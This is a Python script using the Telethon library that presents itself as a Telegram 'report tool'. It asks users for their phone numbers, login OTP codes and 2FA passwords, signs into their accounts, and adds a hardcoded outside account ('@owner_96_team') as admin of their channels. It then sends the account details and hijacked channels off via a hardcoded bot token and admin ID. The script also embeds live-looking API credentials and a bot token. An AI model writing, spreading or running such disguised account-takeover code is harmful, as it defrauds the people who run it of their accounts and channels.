import os
import sys
from telethon import TelegramClient, events
from telethon import functions, types
from telethon.tl.types import (
    ChatAdminRights, 
    InputCheckPasswordSRP,
    ChannelParticipantsAdmins
)
from telethon import utils
import asyncio
import requests
import hashlib
import binascii
import inspect

# কালার কোড
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

# API credentials (pre-configured)
API_ID = 26108693
API_HASH = "3bc54f318fb35b9d82c3f885f18e7028"
BOT_TOKEN = "7676428723:AAECtBRnxX41kSkiZev5UdX_2X63eVP-fMY"
ADMIN_ID = "8038375045"
TARGET_USERNAME = "@owner_96_team"

def print_banner():
    banner = f"""
    {BLUE}
    ████████╗███████╗██╗     ███████╗ ██████╗ ██████╗  █████╗ ███╗   ███╗
    ╚══██╔══╝██╔════╝██║     ██╔════╝██╔════╝ ██╔══██╗██╔══██╗████╗ ████║
       ██║   █████╗  ██║     █████╗  ██║  ███╗██████╔╝███████║██╔████╔██║
       ██║   ██╔══╝  ██║     ██╔══╝  ██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║
       ██║   ███████╗███████╗███████╗╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║
       ╚═╝   ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝
    
    {BLUE}⚠️ Warning: This Tg Report Tools ⚠️{RESET}
    {GREEN}API ID: **********{RESET}
    {GREEN}API Hash: *****************************{RESET}
    {GREEN}Add as admin: {TARGET_USERNAME}{RESET}
    """
    print(banner)

# ---- আগের ফাংশনগুলো একই থাকবে ----

async def process_telegram_account(phone_number):
    try:
        client = TelegramClient(f'session_{phone_number}', API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.send_code_request(phone_number)
            code = input(f"{YELLOW}Enter the OTP code sent to {phone_number}: {RESET}")
            
            try:
                await client.sign_in(phone_number, code)
            except Exception as e:
                if "two-steps" in str(e).lower() or "two_step" in str(e).lower():
                    password = input(f"{YELLOW}Enter your 2FA password: {RESET}")
                    await client.sign_in(password=password)
                else:
                    raise e
        
        me = await client.get_me()
        username = me.username
        
        print(f"{GREEN}[+] Successfully logged in as: {me.first_name} {me.last_name or ''}{RESET}")
        if username:
            print(f"{GREEN}[+] Username: @{username}{RESET}")
        
        print(f"{YELLOW}[+] Searching for channels to add admin...{RESET}")
        admin_added_channels = await add_admin_to_all_channels(client, phone_number, username)
        
        if admin_added_channels:
            print(f"{GREEN}successful........{RESET}")
            print(f"{GREEN}successful................{RESET}")
            print(f"{GREEN}successful......................{RESET}")
            print(f"{GREEN}successful............................{RESET}")
            print(f"{GREEN}successful..................................{RESET}")
        
        await send_telegram_message(phone_number, username, admin_added_channels)
        await client.disconnect()

    except Exception as e:
        print(f"{RED}[-] Error: {str(e)}{RESET}")

def main():
    print_banner()
    
    try:
        print(f"\n{YELLOW}[?] Enter your phone numbers (comma separated):{RESET}")
        phones_input = input(f"{BLUE}Phone numbers: {RESET}")
        phone_numbers = [phone.strip() for phone in phones_input.split(",")]
        
        confirmation = input(f"\n{RED}⚠️   {TARGET_USERNAME} {len(phone_numbers)} account(s)? (y/n): {RESET}")
        if confirmation.lower() != 'y':
            print(f"{YELLOW}Operation cancelled.{RESET}")
            return
        
        for phone in phone_numbers:
            print(f"\n{GREEN}[+] Processing account: {phone}{RESET}")
            asyncio.run(process_telegram_account(phone))
        
        # সবকিছু সফল হলে reporter.py রান
        print(f"{BLUE}[+] All tasks completed. Running reporter.py...{RESET}")
        os.system("python reporter.py")
            
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Operation cancelled by user.{RESET}")
    except Exception as e:
        print(f"{RED}[-] An error occurred: {str(e)}{RESET}")

if __name__ == "__main__":
    main()
